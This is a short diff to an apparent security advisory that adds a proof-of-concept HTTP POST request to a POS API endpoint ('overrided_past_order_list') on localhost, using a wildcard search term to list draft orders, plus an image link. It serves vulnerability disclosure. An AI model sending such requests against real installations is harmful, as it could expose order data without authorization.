@@ -2,6 +2,17 @@
 
 ### PoC
 
+```
+POST /api/method/ury.ury.api.pos_extend.overrided_past_order_list HTTP/1.1
+Host: localhost:8000
+Content-Type: application/json
+User-Agent: Mozilla/5.0
+Accept: application/json
+Content-Length: 47
+
+{"search_term":"*","status":"Draft","start":0}
+```
+
 <img width="462" height="239" alt="image" src="https://github.com/user-attachments/assets/08de380c-a7d8-4c3b-a5ae-a8af71d7a7d9" />
 
 
